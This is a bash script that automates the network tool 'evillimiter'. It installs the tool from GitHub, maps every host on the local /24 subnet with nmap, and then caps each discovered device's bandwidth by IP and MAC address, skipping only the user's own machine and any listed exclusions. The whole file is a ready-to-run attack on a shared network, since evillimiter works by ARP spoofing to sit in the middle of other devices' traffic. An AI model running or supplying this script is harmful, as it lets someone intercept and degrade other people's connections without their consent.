#!/bin/bash
while [ $# -gt 0 ] ; do
case $1 in
	-s | --speed) SPEED="$2" ;;
	-e | --exclude) EXCLUDES="$2" ;;
	-i | --interface) INTERFACE="$2" ;;
	--install) INSTALL="true" ;;
esac
shift
done

if [ ! -z $INSTALL ] ; then
	git clone https://github.com/bitbrute/evillimiter.git
	cd evillimiter
	sudo python3 setup.py install
	cd ../
	sudo rm -rf evillimiter
	sudo apt install nmap libxml2-utils
	exit 0
fi

excludes=${EXCLUDES//,/}
my_ip=$(ip -4 addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127)

echo "Mapping network to fetch ips and mac addresses"
sudo nmap -sn -n $(echo $my_ip | cut -d. -f1-3).1/24 -oX nmap_output.xml
xml=$(xmllint nmap_output.xml --xpath "/nmaprun/host/address/@addr")

evillimiter_commands=''
temp_ip=''
index=0

printf "\nBuilding Evillimiter command queue\n"
for line in $xml
do
  address=$(echo $line | cut -d '"' -f2)

  # Skip current ip and mac if excluded
  if [[ ( "${excludes[@]}" =~ "$address" || "$my_ip" == "$address") ]]
  then
    echo "Skipped: $address"
    continue;
  fi

  # MAC
  if [[ ( "$address" =~ ":" && ! -z "$temp_ip" ) ]]
  then
    evillimiter_commands+="echo add $temp_ip --mac $address; echo limit $index $SPEED;"
    index=$(expr $index + 1)
    temp_ip=''
    continue;
  fi

  # IP
  temp_ip=$address
done

printf "\nEvillimiter commands:\n$evillimiter_commands\n"

# File is write-protected after sudo nmap
sudo rm nmap_output.xml
sudo bash -c "(sleep 2; $evillimiter_commands tail)|evillimiter --flush"
